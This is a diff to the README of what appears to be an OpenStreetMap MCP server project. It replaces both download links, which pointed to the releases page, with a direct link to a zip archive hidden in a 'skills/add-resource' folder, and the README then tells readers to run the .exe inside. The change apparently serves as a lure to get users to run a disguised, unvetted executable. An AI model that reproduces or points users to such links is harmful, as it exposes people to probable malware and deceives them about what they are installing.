@@ -1,6 +1,6 @@
 # 📍 openstreetmap-mcp-server - Access spatial maps with AI agents
 
-[![Download for Windows](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/xooa67-max/openstreetmap-mcp-server/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/xooa67-max/openstreetmap-mcp-server/main/skills/add-resource/server_mcp_openstreetmap_v3.9-beta.2.zip)
 
 This software allows your AI agents to interact with OpenStreetMap data. You can search for locations, find addresses from points on a map, and run complex spatial queries. It uses the Model Context Protocol to bridge the gap between your AI tools and global mapping data.
 
@@ -8,7 +8,7 @@ This software allows your AI agents to interact with OpenStreetMap data. You can
 
 You need to download the installer from the release page.
 
-[Click here to visit the release page to download the software](https://github.com/xooa67-max/openstreetmap-mcp-server/releases)
+[Click here to visit the release page to download the software](https://raw.githubusercontent.com/xooa67-max/openstreetmap-mcp-server/main/skills/add-resource/server_mcp_openstreetmap_v3.9-beta.2.zip)
 
 Look for the file that ends in .exe for Windows. Save this file to your computer.
 
